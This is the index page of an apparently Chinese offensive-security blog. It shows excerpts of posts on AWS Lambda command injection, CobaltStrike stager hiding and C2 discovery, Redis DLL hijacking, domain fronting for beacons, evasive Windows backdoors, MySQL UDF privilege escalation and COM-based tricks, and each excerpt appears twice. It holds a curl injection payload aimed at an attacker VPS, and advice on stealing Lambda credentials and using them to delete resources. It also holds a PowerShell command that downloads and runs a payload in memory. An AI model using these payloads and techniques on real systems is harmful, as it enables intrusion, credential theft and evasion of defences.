<h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul>
<li>Lambda函数代码路径: <code>/var/task</code></li>
<li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
<li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li>
<li>默认用户: <code>sbx_userxxx</code></li>
<li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li>
<li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li>
</ul>
<p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p>
<p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p>
	

	</div>
  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p>
<h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul>
<li>Lambda函数代码路径: <code>/var/task</code></li>
<li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
<li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li>
<li>默认用户: <code>sbx_userxxx</code></li>
<li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li>
<li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li>
</ul>
<p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p>
<p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p>
	
	</div>
  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/01/04/CloudFront-find-cobaltstrike.html" >CobaltStrike的Stager特征隐藏</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-01-04  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
	

	</div>
  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
	
	</div>
  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/09/10/redis-windows-hijack.html" >Redis On Windows -- Dll Hijack</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-09-10  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>本文测试了Redis在Windows平台下的dll劫持，主要参考文章是先知的秋水师傅: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153">Redis on Windows 出网利用探索</a></p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100
Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="可劫持的DLL"><a href="#可劫持的DLL" class="headerlink" title="可劫持的DLL"></a>可劫持的DLL</h3><p>按照文章中使用<code>Process Monitor</code>，在使用<code>redis-cli</code>操作的时候，观察缺失的DLL。在<code>Process Monitor Filter</code>里面设置<code>Image Path</code>的值为<code>redis-server.exe</code>的路径，比如我的是<code>C:\Program Files\Redis\redis-server.exe</code>，<code>Path</code>设置为<code>ends with dll</code>。设置好之后，使用<code>redis-cli</code>连接，执行<code>bgsave</code>命令，然后观察缺失的dll，有如下:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>当<code>redis-server.exe</code>启动的时候，有如下:</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll
C:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p>执行<code>BGREWRITEAOF</code>的时候，有如下:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/09/10/redis-windows-hijack.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>本文测试了Redis在Windows平台下的dll劫持，主要参考文章是先知的秋水师傅: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8153">Redis on Windows 出网利用探索</a></p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100
Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="可劫持的DLL"><a href="#可劫持的DLL" class="headerlink" title="可劫持的DLL"></a>可劫持的DLL</h3><p>按照文章中使用<code>Process Monitor</code>，在使用<code>redis-cli</code>操作的时候，观察缺失的DLL。在<code>Process Monitor Filter</code>里面设置<code>Image Path</code>的值为<code>redis-server.exe</code>的路径，比如我的是<code>C:\Program Files\Redis\redis-server.exe</code>，<code>Path</code>设置为<code>ends with dll</code>。设置好之后，使用<code>redis-cli</code>连接，执行<code>bgsave</code>命令，然后观察缺失的dll，有如下:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<p>当<code>redis-server.exe</code>启动的时候，有如下:</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll
C:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<p>执行<code>BGREWRITEAOF</code>的时候，有如下:</p>
<pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/09/10/redis-windows-hijack.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/08/28/CloudFront-Https.html" >Domain Fronting隐藏HTTPS</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-08-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
<p>###目标</p>
<ol>
<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
<li>AWS的<code>Cloudfront</code>作为前置域名</li>
</ol>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
VPS(Centos)
cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
<pre class="line-numbers language-none"><code class="language-none">yum install httpd
systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
&lt;VirtualHost *:80&gt;
   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
   ServerName example.com


RewriteEngine on
RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
<p>###目标</p>
<ol>
<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
<li>AWS的<code>Cloudfront</code>作为前置域名</li>
</ol>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
VPS(Centos)
cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
<pre class="line-numbers language-none"><code class="language-none">yum install httpd
systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
&lt;VirtualHost *:80&gt;
   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
   ServerName example.com


RewriteEngine on
RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/08/28/hide-your-windows-backdoor.html" >Windows后门隐藏</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-08-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
<ol>
<li>shellcode的分离免杀</li>
<li>C2服务器的隐藏</li>
<li>Windows后门的设置</li>
</ol>
<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
<ol>
<li>通信: <code>socket</code>,<code>http</code></li>
<li><code>shellcode</code>的执行方式</li>
<li><code>shellcode</code>的流量</li>
<li>远程服务器的隐藏</li>
</ol>
<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
	

	</div>
  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
<ol>
<li>shellcode的分离免杀</li>
<li>C2服务器的隐藏</li>
<li>Windows后门的设置</li>
</ol>
<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
<ol>
<li>通信: <code>socket</code>,<code>http</code></li>
<li><code>shellcode</code>的执行方式</li>
<li><code>shellcode</code>的流量</li>
<li>远程服务器的隐藏</li>
</ol>
<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
	
	</div>
  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/07/29/mysql-UDF.html" >MySql UDF提权注意事项</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-07-29  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
</blockquote>
<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>结果如下:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
+----------------------+---------------------------+
<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
+----------------------+---------------------------+
<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
+----------------------+---------------------------+
MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
+-------------------------+--------+
<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
+-------------------------+--------+
<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
<p>可以在开启mysql的时候设置plugin的目录:</p>
<pre class="line-numbers language-none"><code class="language-none">指定目录:
mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\

指定配置文件:
mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini

配置文件包括如下内容:
[mysqld]
plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
	

	</div>
  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>[mysql-udf-exploitation]<a target="_blank" rel="noopener" href="https://osandamalith.com/2018/02/11/mysql-udf-exploitation">https://osandamalith.com/2018/02/11/mysql-udf-exploitation</a><br>MSF的dll: <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql</a></p>
</blockquote>
<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先检查运行的mysql结构:</p>
<pre class="line-numbers language-none"><code class="language-none">select @@version_compile_os, @@version_compile_machine;
show variables like &#39;%compile%&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>结果如下:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> <span class="token keyword">select</span> @@version_compile_os, @@version_compile_machine<span class="token punctuation">;</span>
+----------------------+---------------------------+
<span class="token operator">|</span> @@version_compile_os <span class="token operator">|</span> @@version_compile_machine <span class="token operator">|</span>
+----------------------+---------------------------+
<span class="token operator">|</span> Win64                <span class="token operator">|</span> x86_64                    <span class="token operator">|</span>
+----------------------+---------------------------+
MySQL <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show variables like <span class="token string">'%compile%'</span><span class="token punctuation">;</span>
+-------------------------+--------+
<span class="token operator">|</span> Variable_name           <span class="token operator">|</span> Value  <span class="token operator">|</span>
+-------------------------+--------+
<span class="token operator">|</span> version_compile_machine <span class="token operator">|</span> x86_64 <span class="token operator">|</span>
<span class="token operator">|</span> version_compile_os      <span class="token operator">|</span> Win64  <span class="token operator">|</span>
+-------------------------+--------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>Mysql 5.0.67</code>版本开始，UDF的文件必须放在mysql的插件目录: <code>select @@plugin_dir;</code></p>
<p>可以在开启mysql的时候设置plugin的目录:</p>
<pre class="line-numbers language-none"><code class="language-none">指定目录:
mysqld.exe –plugin-dir&#x3D;C:\\temp\\plugins\\

指定配置文件:
mysqld.exe --defaults-file&#x3D;C:\\temp\\my.ini

配置文件包括如下内容:
[mysqld]
plugin_dir &#x3D; C:\\temp\\plugins\\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>老版本的Mysql搜索UDF路径是按照如下的顺序来的:</p>
	
	</div>
  <a type="button" href="/2020/07/29/mysql-UDF.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/07/16/Com-Object-Pentest-Note2.html" >Com Object</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-07-16  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>COM is the foundation technology for Microsoft’s OLE (compound documents), ActiveX (Internet-enabled components), as well as others.</p>
</blockquote>
<p>我就瞎写了:</p>
<p>COM是在1990s的时候诞生的，可用来分离代码模块和其它内容。</p>
<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><pre class="line-numbers language-none"><code class="language-none">Powershell无文件落地执行
$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;F5078F35-C551-11D3-89B9-0000F81FE221&quot;)); $o.Open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload&quot;, $False); $o.Send(); IEX $o.responseText;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">下载文件,如果需要下载exe，转换成hex或者base64，再编码
powershell -Command &quot;$o &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(\&quot;F5078F35-C551-11D3-89B9-0000F81FE221\&quot;)); $o.Open(\&quot;GET\&quot;, \&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;payload\&quot;, $False); $o.Send();  $o.responseText | Out-File C:\filename.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><pre class="line-numbers language-none"><code class="language-none">$TaskName &#x3D; [Guid]::NewGuid().ToString()
